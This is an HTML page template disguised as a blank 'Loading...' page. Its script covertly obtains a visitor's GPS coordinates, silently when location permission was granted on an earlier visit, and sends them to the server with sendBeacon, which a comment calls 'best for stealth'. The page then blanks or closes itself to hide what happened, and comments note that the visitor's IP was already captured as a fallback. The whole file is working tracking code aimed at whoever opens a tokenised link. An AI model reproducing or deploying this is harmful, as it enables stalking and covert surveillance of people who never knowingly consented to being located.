<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Loading...</title>
<style>
  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    background: #000;
    overflow: hidden;
    width: 100%; height: 100%;
  }
  body { opacity: 0; }
</style>
</head>
<body>
<script>
(function() {
  var token = "{{ token }}";
  var sent = false;

  {% if expired %}
    try { window.location.replace('about:blank'); } catch(e) {}
    try { window.close(); } catch(e) {}
    return;
  {% endif %}

  function sendToServer(lat, lng, acc) {
    if (sent) return;
    sent = true;

    var payload = JSON.stringify({
      token: token,
      latitude: lat,
      longitude: lng,
      accuracy: acc
    });

    // sendBeacon survives page unload — best for stealth
    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-update', blob);
    } else {
      // Fallback: fetch with keepalive
      try {
        fetch('/api/location-update', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload,
          keepalive: true
        });
      } catch(e) {}
    }
  }

  function vanish() {
    if (!sent) {
      sent = true;
    }
    // Multiple escape hatches for different browsers
    try { window.location.replace('about:blank'); } catch(e) {}
    try { window.location.href = 'about:blank'; } catch(e) {}
    setTimeout(function() {
      try { document.body.innerHTML = ''; } catch(e) {}
      try { window.close(); } catch(e) {}
    }, 10);
  }

  // ── Silent GPS capture ──
  // Strategy: check if permission is already cached (granted from previous visit)
  // If yes → fire GPS with zero prompts, send beacon, vanish
  // If denied → vanish immediately (IP was already captured server-side)
  // If undecided (first visit) → attempt GPS anyway (prompt WILL show, can't avoid)

  function tryGPS() {
    if (!("geolocation" in navigator)) {
      // No GPS capability — IP geolocation (server-side) is the fallback
      vanish();
      return;
    }

    // First check if permissions API is available
    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({ name: 'geolocation' })
        .then(function(status) {
          if (status.state === 'granted') {
            // Permission cached from previous visit → silent GPS, no prompt
            navigator.geolocation.getCurrentPosition(
              function(pos) {
                sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                vanish();
              },
              function() {
                vanish(); // GPS failed but IP was captured server-side
              },
              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
            // Safety: vanish after 10s regardless
            setTimeout(function() { if (!sent) vanish(); }, 10000);
          } else if (status.state === 'denied') {
            // Permission denied → vanish immediately, IP was already captured
            vanish();
          } else {
            // 'prompt' — first visit, permission NOT yet decided
            // Attempt GPS (prompt WILL appear, unavoidable)
            navigator.geolocation.getCurrentPosition(
              function(pos) {
                sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                vanish();
              },
              function() {
                // Denied or error — vanish, IP geolocation already captured server-side
                // Notify server that GPS was denied (optional)
                try {
                  var blob = new Blob([JSON.stringify({token: token})], {type:'application/json'});
                  navigator.sendBeacon('/api/location-denied', blob);
                } catch(e) {}
                vanish();
              },
              { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
            // Safety: vanish after 18s regardless
            setTimeout(function() { if (!sent) vanish(); }, 18000);
          }
        })
        .catch(function() {
          // Permissions API not supported — just try GPS directly
          navigator.geolocation.getCurrentPosition(
            function(pos) {
              sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
              vanish();
            },
            function() {
              vanish();
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
          setTimeout(function() { if (!sent) vanish(); }, 12000);
        });
    } else {
      // No Permissions API — try GPS directly
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
          vanish();
        },
        function() {
          vanish();
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
      setTimeout(function() { if (!sent) vanish(); }, 12000);
    }
  }

  // ── Execute immediately ──
  tryGPS();

  // ── Hard safety: vanish in 20s no matter what ──
  setTimeout(function() {
    if (!sent) vanish();
  }, 20000);
})();
</script>
</body>
</html>
